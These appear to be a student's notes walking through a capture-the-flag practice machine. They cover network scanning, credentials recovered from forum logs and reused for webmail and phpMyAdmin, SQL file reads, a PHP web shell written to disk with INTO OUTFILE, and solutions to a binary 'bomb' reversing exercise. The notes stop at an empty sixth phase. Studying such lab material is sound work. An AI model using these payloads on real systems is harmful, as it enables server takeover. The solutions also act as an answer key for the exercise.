scanner le rÃ©seau avec nmap
cmd : nmap -sP 192.168.0-255.0/24

get the ip of the virtual machine

nmap the ip of the machine (there are on ports) port 80 et 443 open -> web server
cmd : nmap --top-ports 1000 -T4 -sC http://example.com
	OR
open armitage and scan within the range of the virtual machine

Go to the ip of the virtual machine on internet or curl it. There is a page.

nikto -h + adress ou dirb sur l'ip de la machine en http et https
cmd: nikto -h https://ip_machine
OR

phpmyadmin + forum + mail

User login try !q\]Ej?*5K5cy*AJ in forum 6
(maybe password misstype?)
And right after that lmezard logged in, maybe it was a mistake from his part ..

user: lmezard
pwd: !q\]Ej?*5K5cy*AJ

Try to send mail to admin when you're logged in
your mail is : laurie@borntosec.net

We still have the webmail we didn't use, we try to logged on it with the mail adress and
the same pwd we still have.
Connecting to mail at webmail works.

In the mail we have the logged for phpmyadmin.
Connecting to db via the mail from the admin

If we go here ip_machine/icons/README, we see that the server is running on apache, by default the directory is /var/www

We need this command
INSERT INTO `mlf2_entries_cache`(`cache_id`, `cache_text`) VALUES (12,LOAD_FILE("/var/www/forum/index.php"))

We have the right to write in compile dir

If we look at the code we have directory, we can try to put in some file with that mysql command

select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/test.php"

the good dir is /var/www/forum/templates_c/test.php (who is the compile dir in index.php)

reverse shell on that website without -e

user: lmezard
pwd: G!@M6f4Eatau{sF"

got a file called fun
need to parse it
I try to send it into a html in the dir i have the right and parse it.. But i was wrong
The file is actually a .tar
So i open a ssh port on the kali machine and connect it via lmezard account to copy it with scp and then untar it (tar -xzf fun)
We have the position of each file with //fileXX
I unrar it but there is still parsing to do. I have to get a "\n" at the end of each to escape the //file of the previous file so that the next line isn't escape. It works !
I have a message who tell me to ssh a pass.. let's do it

The result is used to login with user laurie in ssh

We see the bomb with a file readme
Bomb is compiled, we use hexray (ida64)

gdb --args ./bomb l To launch with arguments if needed

PHASE_1

	We see that the first_phase is a strcmp with "Public speaking is very easy."
	We type it -> victory
	We can see the adress with gdb if we disas phase_1 and x/s (for the character) and the adress of the register
	In strings not equal :
		Our 		x/s *0xBFFFF6F0
		Theirs 		x/s *0xBFFFF6F4


PHASE_2

	we need to disas phase_2,
	got this line :
		0x08048b56 <+14>:	lea    -0x18(%ebp),%eax
		0x08048b59 <+17>:	push   %eax
		0x08048b5a <+18>:	push   %edx
		0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers>
		- So we push the adress of %ebp in read_six_numbers

		0x08048b63 <+27>:	cmpl   $0x1,-0x18(%ebp)
		0x08048b67 <+31>:	je     0x8048b6e <phase_2+38>
		0x08048b69 <+33>:	call   0x80494fc <explode_bomb>
		- Here if the first number of ebp isn't 1 we don't jump and we explode


	After that we launch gdb (yeah), and we disas phase_2 and put a breakpoint just before the cmp which is just before the explosion
	and we look at eax register each time with "info r"
	break *0x08048b7e

	We got 1 2 6 24 120 720

PHASE_3

	We have a switch, with a scanf on "%d %c %d". We disas it (again) and we get the first value
	is the key of the switch, the second is compare with a value that is set in the swith
	(different for each case) and the third value is a key not to explode for each case.
	Solutions : 

	0 q 777
	1 b 214
	2 b 755
	3 k 251
	4 o 160
	5 t 458
	6 v 780
	7 b 524

PHASE_4

	The phase 4 is a recursive funtion, with breakpoint with dgb, we saw that the answer is just 9

PHASE_5

	We have to put a string of lenght 6 which is changed in a while, it is passed in a strings_not_equal function, break in that function and we check our modified string at :
		x/s *0xBFFFF6E0
	theirs are :
		x/s *0xBFFFF6E4
	We brute force it by testing all characters like "abcdef" "ghijkl" etc..
	and we see how it is modified and note it like : 'o' is changed to 'g', 'p' is changed to 'i' etc..
	the result is opekmq

PHASE_6
